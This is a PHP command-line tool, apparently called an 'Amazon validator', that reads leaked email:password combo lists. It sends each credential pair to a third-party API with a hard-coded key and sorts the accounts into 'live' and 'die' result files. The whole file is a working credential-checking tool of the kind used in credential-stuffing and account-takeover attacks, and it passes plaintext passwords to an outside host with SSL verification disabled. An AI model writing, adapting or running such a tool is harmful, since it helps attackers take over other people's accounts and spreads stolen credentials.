<?php

/* ========================
 * CODE BY ZLAXTERT
 * AMAZON VALIDATOR V3.1.0
 * APIs FROM BANDITCODING
 * ========================
*/

date_default_timezone_set("Asia/Jakarta");
error_reporting(1);
ini_set("memory_limit", '-1');
define("OS", strtolower(PHP_OS));
$date = date("l, d-m-Y (H:m:s)");

//========> REQUIRE

require_once "xnxx/gangbang.php";
require_once "xnxx/threesome.php";

//========> BANNER

echo banner();

//========> GET FILE

enterlist:
echo "[+] Your file (example.txt) >> ";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
	echo PHP_EOL."[!] FILE NOT FOUND [!]".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

//=========> THREADS

reqemail:
echo "[+] Threads (Max 10) >> ";
$reqemail = trim(fgets(STDIN));
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 5 : $reqemail;
if($reqemail > 10) {
	echo PHP_EOL."[!] MAX 10 [!]".PHP_EOL;
	goto reqemail;
}

//=========> COUNT

$l = 0;
$d = 0;
$t = 0;
$u = 0;
$no = 0;
$total = count($lists);
echo "\n[!] TOTAL \e[32;1m$total \e[0mLISTS [!]\n\n";

//========> LOOPING

$rollingCurl = new \RollingCurl\RollingCurl();

foreach($lists as $list){
    //API
    $api = "http://api.apeboard.pw/amazon/api.php?submit=1&list=".$list."&apikey=BNDT-2803654-FREE";
    // EXPLODE
    if(strpos($list, "|") !== false) list($email, $pass) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pass) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	if($c%1000000==0) {
		if(file_exists(dirname(__FILE__)."/cookies/amazon.cook")) unlink(dirname(__FILE__)."/cookies/amazon.cook");
	}
    $email = str_replace(" ", "", $email);
    //CURL
    $rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_COOKIEJAR => dirname(__FILE__)."/cookies/amazon.cook", CURLOPT_COOKIEFILE => dirname(__FILE__)."/cookies/amazon.cook", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => 1, CURL_IPRESOLVE_V4))->get($api);
}

//==========> ROLLING CURL

$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
    global $listname, $no, $total, $l, $d, $u, $t;
    $no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$list = $params["list"];
	$x = $request->getResponseText();
    $js = json_decode($x, TRUE);
    $msg = $js['data']['msg'];
    echo " [\e[31;1m".$no."\e[0m/\e[32;1m".$total."\e[0m]\e[0m";
    if(strpos($x, '"code":"200"')){
        $l++;
        save_file("result/live.txt","[+] LIVE | $list | [$msg] | BY ./ZLAXTERT");
        echo "\e[32;1m LIVE\e[0m |\e[34;1m $list \e[0m| ";
    }elseif(strpos($x, '"code":"404"')){
        $d++;
        save_file("result/die.txt","$list");
        echo "\e[31;1m DIE \e[0m|\e[34;1m $list \e[0m| ";
    }elseif(strpos($x, "Request Timeout")){
        $t++;
        save_file("result/tryagain.txt","$list");
        echo "\e[36;1m TIMEOUT \e[0m| ";
    }elseif(strpos($x, "The server is temporarily busy, try again later!")){
        $t++;
        save_file("result/tryagain.txt","$list");
        echo "\e[36;1m SERVER BUSSY \e[0m| ";
    }else{
        $u++;
        save_file("result/unknonwn.txt","$x");
        echo "\e[33;1m UNKNOWN \e[0m|\e[34;1m $list \e[0m| ";
    }
    echo "\e[33;1mBY \e[36;1m./ZLAXTERT \e[37;1mV.3.1.0\e[0m";
    echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();

//============> END

echo PHP_EOL;
echo "================[DONE]================".PHP_EOL;
echo " DATE      : ".$date.PHP_EOL;
echo " LIVE      : ".$l.PHP_EOL;
echo " DIE       : ".$d.PHP_EOL;
echo " TRYAGAIN  : ".$t.PHP_EOL;
echo " UNKNOWN   : ".$u.PHP_EOL;
echo " TOTAL     : ".$total.PHP_EOL;
echo "======================================".PHP_EOL;
echo "File saved in folder 'result' ".PHP_EOL;

//============> FUNCTION

function save_file($name_file, $isi){
    $click = fopen("$name_file","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}
function banner(){
    $banner = "    
\e[32;1mVERSION 3.1.0\e[0m                                            
\e[34;1m           _____ _____ _____ _____ _____ _____                 
\e[34;1m          |  _  |     |  _  |__   |     |   | |                
\e[34;1m          |     | | | |     |   __|  |  | | | |                
\e[34;1m          |__|__|_|_|_|__|__|_____|_____|_|___|                                                                                                                              
\e[31;1m   _____ _____ __    _____ ____  _____ _____ _____ _____ 
\e[31;1m  |  |  |  _  |  |  |     |    \|  _  |_   _|     | __  |
\e[31;1m  |  |  |     |  |__|-   -|  |  |     | | | |  |  |    -|
\e[31;1m   \___/|__|__|_____|_____|____/|__|__| |_| |_____|__|__|
                                                 \e[33;1mZLAXTERT
\e[37;1m _________________________________________________________\e[0m
";
    return $banner;
}

?>
